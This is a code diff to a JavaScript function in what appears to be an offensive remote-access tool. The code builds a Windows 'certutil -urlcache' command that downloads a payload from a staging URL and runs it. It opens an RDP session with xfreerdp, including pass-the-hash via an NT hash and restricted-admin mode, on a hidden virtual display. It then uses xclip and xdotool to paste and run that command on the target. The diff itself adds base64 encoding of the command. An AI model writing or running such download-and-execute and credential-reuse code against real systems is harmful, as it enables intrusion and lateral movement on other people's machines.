@@ -16537,12 +16537,17 @@ async function ipcRun(action) {
       // so the RDP window never appears on the operator's real screen.
       // xclip writes to the virtual display clipboard; xdotool targets the same display.
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
-      const winCmd    = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
-      const winCmdEsc = winCmd.replace(/'/g, "'\\''");
-      // xfreerdp without the DISPLAY prefix so $VDISP is not overridden
-      const xfreeCmd  = `xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore /w:800 /h:600 /log-level:OFF`;
-      // Wrapped in bash -c to avoid sh/dash incompatibilities (RANDOM, $$, etc.)
-      // Background commands combine & and $! capture to avoid &; syntax error
+      const winCmd   = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
+      // Base64-encode clipboard content so it is quoting-safe inside any shell wrapper
+      const winCmdB64 = btoa(winCmd);
+      // Use double-quoted xfreerdp args — safe inside bash -c '...' (only single quotes break it)
+      const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
+      const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
+      const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
+      const rdpDomDQ   = dDQ ? ` /d:"${dDQ}"` : '';
+      const rdpCredsDQ = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:"${pDQ}"`;
+      const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /w:800 /h:600 /log-level:OFF`;
+      // Wrapped in bash -c '...' — content must contain no literal single quotes
       const steps = [
         `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
         `VDISP=:$(( $$ % 400 + 200 ))`,
@@ -16553,7 +16558,7 @@ async function ipcRun(action) {
         `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | head -1)`,
         `[ -z "$WID" ] && WID=$(DISPLAY="$VDISP" xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
         `echo "[*] RDP window=$WID pid=$XPID vdisp=$VDISP"`,
-        `printf '%s' '${winCmdEsc}' | DISPLAY="$VDISP" xclip -selection clipboard`,
+        `printf %s "${winCmdB64}" | base64 -d | DISPLAY="$VDISP" xclip -selection clipboard`,
         `sleep 1`,
         `DISPLAY="$VDISP" xdotool windowfocus --sync "$WID"`,
         `sleep 0.3`,
